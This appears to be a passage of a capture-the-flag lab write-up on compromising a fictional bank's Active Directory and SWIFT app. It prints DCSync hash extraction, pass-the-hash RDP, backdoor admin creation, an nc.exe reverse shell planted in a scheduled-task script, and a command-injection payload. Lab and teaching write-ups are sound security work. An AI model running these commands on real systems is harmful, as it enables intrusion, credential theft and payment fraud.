Now in ligolo console switch to the new session and start the tunnel using the following command:

	start --tun ligolo_rdc	
Add route to the bank dc server:

 	ip route add 10.200.89.101/32 dev ligolo_rdc

### Access bank domain controller
Now we can RDP directly from our attacker machine to the bank dc, using the user <b>it.supportea (domain thereserve.loc)</b>. 
I started to discovery domain's host using powershell:

	get-adcomputer -filter *

		DistinguishedName : CN=WORK1,OU=Workstations,DC=bank,DC=thereserve,DC=loc
		DNSHostName       : WORK1.bank.thereserve.loc
		Enabled           : True
		Name              : WORK1
		ObjectClass       : computer
		...
		
		DistinguishedName : CN=WORK2,OU=Workstations,DC=bank,DC=thereserve,DC=loc
		DNSHostName       : WORK2.bank.thereserve.loc
		Enabled           : True
		Name              : WORK2
		ObjectClass       : computer
		...
		
		DistinguishedName : CN=JMP,OU=Servers,DC=bank,DC=thereserve,DC=loc
		DNSHostName       : JMP.bank.thereserve.loc
		Enabled           : True
		Name              : JMP
		ObjectClass       : computer
		...
Apart the bankdc I found other 3 computer, one named JMP probably a jump box. We can find the IP addresses as follows:

	Get-DnsServerResourceRecord -ZoneName "bank.thereserve.loc" -RRType "A" | select-object -ExpandProperty recorddata -Property Hostname
		Hostname       IPv4Address   PSComputerName
		--------       -----------   --------------
		bankdc         10.200.89.101
		DomainDnsZones 10.200.89.101
		example        10.200.89.200
		JMP            10.200.89.61
		thereserve.loc 10.200.89.100
		swift          10.200.89.201
		WORK1          10.200.89.51
		WORK2          10.200.89.52

From the query results it seems that a record is present for another host called swift that could be the web app used to perform the transaction.
I continued to enumerate the bank domain looking for groups:

	Get-ADGroup -filter * -searchbase "DC=bank,DC=thereserve,DC=loc" | ft
 		...
 		CN=Tier 2 Admins,OU=Groups,DC=bank,DC=thereserve,DC=loc                          ity
		CN=Tier 1 Admins,OU=Groups,DC=bank,DC=thereserve,DC=loc                          ity
		CN=Tier 0 Admins,OU=Groups,DC=bank,DC=thereserve,DC=loc                          ity
		CN=Payment Approvers,OU=Groups,DC=bank,DC=thereserve,DC=loc                      ity
		CN=Payment Capturers,OU=Groups,DC=bank,DC=thereserve,DC=loc                      ity
		CN=SWIFT Support,OU=Groups,DC=bank,DC=thereserve,DC=loc                          ity

Among all, these groups look interesting to accomplish our final goal: perform a transaction on the swift app. 
Let's see user members:
	
 	Get-ADGroupMember -Identity "Payment Approvers" | Select-Object name, objectClass,distinguishedName
		name     objectClass distinguishedName
		----     ----------- -----------------
		a.holt   user        CN=a.holt,OU=Back-Office,OU=Employees,DC=bank,DC=thereserve,...
		r.davies user        CN=r.davies,OU=Back-Office,OU=Employees,DC=bank,DC=thereserv...
		a.turner user        CN=a.turner,OU=Back-Office,OU=Employees,DC=bank,DC=thereserv...
		s.kemp   user        CN=s.kemp,OU=Back-Office,OU=Employees,DC=bank,DC=thereserve,...
  
  	 Get-ADGroupMember -Identity "Payment Capturers" | Select-Object name, objectClass,distinguishedName
		name      objectClass distinguishedName
		----      ----------- -----------------
		s.harding user        CN=s.harding,OU=Front-Office,OU=Employees,DC=bank,DC=theres...
		g.watson  user        CN=g.watson,OU=Front-Office,OU=Employees,DC=bank,DC=therese...
		t.buckley user        CN=t.buckley,OU=Front-Office,OU=Employees,DC=bank,DC=theres...
		c.young   user        CN=c.young,OU=Front-Office,OU=Employees,DC=bank,DC=thereser...
		a.barker  user        CN=a.barker,OU=Front-Office,OU=Employees,DC=bank,DC=therese...

As we know the principle of separation of duities is applayed to confirm a transaction. The first thing I thought was to add two users to appropriate groups to check if the authentication
on the swift application is bounbded to AD. First we have to verify if we can reach the swift app directly from the bankdc host, but it's not the case. So probably we need to use the jump host
to access the swift application.
	
On the attacker machine I added the following routes:

	ip route add 10.200.89.51/32 dev ligolo_rdc & ip route add 10.200.89.52/32 dev ligolo_rdc & ip route add 10.200.89.61/32 dev ligolo_rdc
Then I tried to login as the it.supportea user to the jmp host, using remmina; even if we are Enterprise Admins it seems that we cannot access the jump box, so I added a new user to the Tier 0 Admins group form the bankdc server:

	net user it.support_bank Password2@ /ADD /DOMAIN
 	net group "Tier 0 Admins" it.support_bank /ADD /DOMAIN
#### Flags submission
You can now submit flags 13 and 14
 
### Access to jmp server
With the newly created users we can now access the JMP host in RDP. Being part of the Tier 0 admins involves being administrator of the host too. Once logged on the jump box I started the
information gathering process. When searching for juicy file I found this one:

	ps: C\Users>Get-ChildItem -Recurse | Select-String "password" -List | Select Path

		Path
		----
		C:\Users\a.holt\Documents\Swift\swift.txt
		...
Looking at swift.txt we got the following:

	cat C:\Users\a.holt\Documents\Swift\swift.txt
	Welcome approverto the SWIFT team.
	You're credentials have been activated. As you are an approver, this has to be a unique password and AD replication is disallowed.
	You can access the SWIFT system here: http://swift.bank.thereserve.loc
Very sadly I knew that the password to access the swift application are not synched to AD. 
Connecting in RDP, using the it.support_bank user, on the two workstations (work1 and work2) I performed the same research and I found 3 files:

	PS C:\Users> Get-ChildItem -Recurse | Select-String "password" -List | Select Path
	
	Path
	----
	C:\Users\a.barker\Documents\SWIFT\Swift.txt
	C:\Users\g.on\Documents\SWIFT\swift.txt
	C:\Users\t.buckley\Documents\Swift\swift.txt

Inspecting the g.watson user's file we found a password:

	cat C:\Users\g.watson\Documents\SWIFT\swift.txt
  	Welcome capturer to the SWIFT team.
	You can access the SWIFT system here: http://swift.bank.thereserve.loc
	#Storing this here:
	Corrected1996
 
 #### Flag submissions
 We can now submit flags 9, 10, 11 and 12.
 Now if we visited the swift URL from the JMP host (actually you can reache the swift app from work1 and work2) we can use the following credentials to login: 
 
 	g.watson@bank.thereserve.loc\Corrected1996

Since <b>g.watson is part of the capturer group</b>, we need to find valid credentials for an approver. We know that <b>a.holt user is member of the approver</b>, since we foud the welcome message on the
JMP host, inspecting his appdata folder I noticed that the saved password default file for Chrome is present: <b>C:\Users\a.holt\AppData\Local\Google\Chrome\User Data\Default\Login Data</b>.
The file is encrypted using the CryptProtectData DPAPI function. In theory could be possible to extract the hash in some way without being the logged in as the user, then to try to crack it offline, but it seemed to me overcomplicated. A faster approach in this situation, try to follow the KIS principle, could be performing a DCSync attack to get the NTLM hash of a.holt user. An even faster solution would be changing directly a.holt password but in a real engagement this action will be noticed for sure.
On ligolo proxy I set another listener on the session 2 (the one coming froom rootdc), to forward the request on port 8000 of rootdc to the same port on our attacker machine, that expose the python webserver:

	listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp

Since we want to access the service from a remote host (bankdc) to download the DCSyncer file, we need to open the corresponding port on rootdc firewall (powershell as administrator):

	New-NetFirewallRule -DisplayName 'Windows Updater' -Profile 'Domain' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8000
	Name                  : {060a00ee-3d26-4e9a-bd8b-97793f28127b}
	DisplayName           : FWD Web Server
	...
	Enabled               : True
	Profile               : Domain
	Platform              : {}
	Direction             : Inbound
	Action                : Allow
	EdgeTraversalPolicy   : Block
	LooseSourceMapping    : False
	LocalOnlyMapping      : False
	Owner                 :
	PrimaryStatus         : OK
	Status                : The rule was parsed successfully from the store. (65536)
	EnforcementStatus     : NotApplicable
	PolicyStoreSource     : PersistentStore
	PolicyStoreSourceType : Local

Now from the bankdc host we can proceed to download the DCSyncer exe from the attacker machine visiting the following URL:

 	http://10.200.89.100:8000/DCSyncer.exe
 
As usual I set an exclusion folder to windows defender and saved the file there. Then I executed the attack:

	PS C:\Users\it.support_bank\def-exc> .\DCSyncer-x64.exe > sync.txt
 
Searching the file for a.holt we can read the hashed password for the user:

	Object RDN           : a.holt
	SAM Username         : a.holt
	User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
	Object Security ID   : S-1-5-21-3455338511-2124712869-1448239061-1155
	Object Relative ID   : 1155
	
	Credentials:
	  Hash NTLM: d1b47b43b82460e3383d974366233ddc

At this point I though to use xfreerd that support PTH to access the JMP host. Before to proceed we need to set the following on the JMP host (perform the commands as administrator):

	reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
	The operation completed successfully.

The user must be member of the local admin group (otherwise you won't be able to connect to the JMP using PTH)
	
 	net localgroup administrators "bank.thereserve.loc\a.holt" /add

More information can be found [here](https://medium.com/@jakemcgreevy/pass-the-hash-pth-with-rdp-80595fb38bef)

From the attacker machine I connected using xfreerdp, since remmina does not support PTH:

	xfreerdp /u:"bank.thereserve.loc\a.holt" /pth:d1b47b43b82460e3383d974366233ddc /v:10.200.89.61

### Compromise swift application
Once logged in as <b>a.holt user</b> I thought that I could find the credentials to access the swift application saved in Chrome, but opening the passwords tab on the browser settings I found nothing.
Probably something was messed up with DPAPI master key that prevent me to see saved password, maybe login using PTH involves some issue, actually I need to investigate the problem further.
At the moment I decided to give up this way and I started again to perform information gathering on bank subdomain controller (bankdc). I logged in using the administrator accout <b>it.support_bank</b>; again I started to search for juicy files containing the word 'password' in it.
I started from C:\users folder, but I found nothing, then proceeding to search in other folders, finally I found the following:

	PS C:\Windows\SYSVOL> Get-ChildItem -Recurse  | Select-String "password" -List | Select -ExpandProperty Path
		C:\Windows\SYSVOL\domain\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
		C:\Windows\SYSVOL\domain\scripts\approver_api_script.py
		C:\Windows\SYSVOL\sysvol\bank.thereserve.loc\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
		C:\Windows\SYSVOL\sysvol\bank.thereserve.loc\scripts\approver_api_script.py
		
The approver_api_script sounds really promising:
		
	cat C:\Windows\SYSVOL\domain\scripts\approver_api_script.py 
		#This script can be used by approvers to directly interface with the API of the SWIFT backend to approve payments.
		#The script first generates a JWT for the user and then makes the approval request
		
		username = "r.davies" #Change this to your approver username
		password = "thereserveapprover1!" #Change this to your approver password
		
		import requests
		session = requests.session()
		data = session.get("http://swift.bank.thereserve.loc/)
		token = session.post("http://swift.bank.thereserve.loc/login", {username: username, password: password})
		#TBC rest of script should be added

Trying these credentials on the swift application I was able to access the application as an approver user, so now we are in the position to execute the whole transaction flow since we are in control of both user's profile: capturer and approver. To accomplish the task just follow the instruction on the e-citizen portal. Once authenticated, you can submit the following flags in order:
- 17, 18, 19
- 20: Since the instructions were not so clear (at least for me) the PIN to approve the transation is sent to your email address, the one provided during the registration to the e-citizen portal. Access you email at mail.thereserve.loc/index.php and look for email containing your PIN

## Conclusion
The challange was really hard and it takes 2 weeks (2 hours a day) to me to finish. I'd say that it is quite realistic, but in my opinion in an engagement for a real bank the security maturity level it would be higher compared to TheReserve. Anyway the network architecture provided here is realistic for sure. Performing the tasks I tried to keep as stealthy as possible, so I avoided to use Mimikatz for istance, anyway I left some indicators (IOC) behind me:
- Administrator's account creation
- Defender folder exclusions (I avoided to complitely disable Defender)
- Tools: Ligolo-NG agent, Rubeus, DCSyncer, SampleSpool
- Account take-over

I'd say that the lab is one of the best I've ever done, and after having completed the Redteamer learning path you cannot miss.

## Remediation
I'd suggest to TheReserve the following remediation steps:
- Users security awarness training (since I found weak and reused passwords, password written in code, default credential)
- Continuos monitoring, install a SIEM\XDR solution
- Hardening AD, including Kerberos (see notes for some resources), use gMSA for service account


## Notes
### Privilege escalation on wrk2
You can also escalate your privileges in wrk2. Once logged in as regualar user (I used laura.wood account), you can notice that there is nc in the downloads folder, furthermore issuing the following command:

	schtasks /query /v | findstr "SYSTEM" | findstr /i /v "windir" | findstr /i /v "systemroot"
  We can notice a fullsync task that call a batch script:

	WRK2             FULLSYNC                                 4/27/2024 12:14:36 PM  Ready           Interactive/Background  4/27/2024 12:09:37 PM             1 CORP\Administrat C:\SYNC\sync.bat                                   N/A                                      N/A                                                                              Enabled                Disabled                                 Stop On Battery Mode, No Start On Batteries      SYSTEM                                   Disabled                       72:00:00                                 Scheduling data is not available in this format.                                 One Time Only, Minute        12:19:36 PM  4/2/2023   N/A        N/A                                         N/A                                         0 Hour(s), 5 Minute(s)   None                 Disabled                       Disabled                           

Let's check the permission sets on the batch file:

 	icacls "C:\SYNC\sync.bat"
	C:\SYNC\sync.bat Everyone:(F)
                 BUILTIN\Users:(F)
                 NT AUTHORITY\SYSTEM:(I)(F)
                 BUILTIN\Administrators:(I)(F)
                 BUILTIN\Users:(I)(RX)
So we can modify the file, eventually to get a recverse shell on our attacker machine using netcat. So on the attacker machine lunch a listener:

	nc -lvp 1234

 On wrk2 modify sync.bat as follows:

 	copy C:\Windows\Temp \\s3.corp.thereserve.loc\backups\ & C:\users\laura.wood\Downloads\nc.exe 12.100.1.8 1234 -e powershell
The IP address refers to my VPN IP on tun0 interface. Then you can wait 5 minutes when the task will be executed or lunch it manually using

	SCHTASKS /Run /? /TN FULLSYNC

 Then we get a reverse powershell as system

 	listening on [any] 1234 ...
	10.200.89.22: inverse host lookup failed: Unknown host
	connect to [12.100.1.8] from (UNKNOWN) [10.200.89.22] 63061
	Windows PowerShell 
	Copyright (C) Microsoft Corporation. All rights reserved.
	PS C:\Windows\system32> whoami
		whoami
		nt authority\system


### Command injection VPN Server OVPN file generator form
The form to generate the OVPN file is vulnerable to command injection: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
You can test it submitting the following value:

    $(`sleep 5`)

### Error submitting flags

	Warning: Permanently added '10.200.89.101' (ECDSA) to the list of known hosts.
	THMSetup@10.200.89.101: Permission denied (publickey,keyboard-interactive).

If you get this type of error, as indicated in the Discord channell, that problem can happen is if someone tampered with the admin SSH authorized_keys files on the host and deleted the existing keys. A network reset should resolve the issue

### References
### Hardening AD
- https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/active-directory-hardening-series-part-4-enforcing-aes-for/ba-p/4114965
- https://trustmarque.com/resources/a-guide-to-defending-against-kerberoasting-and-what-you-can-do/
- https://www.sentinelone.com/cybersecurity-101/what-are-pass-the-hash-pth-pass-the-ticket-ptt/
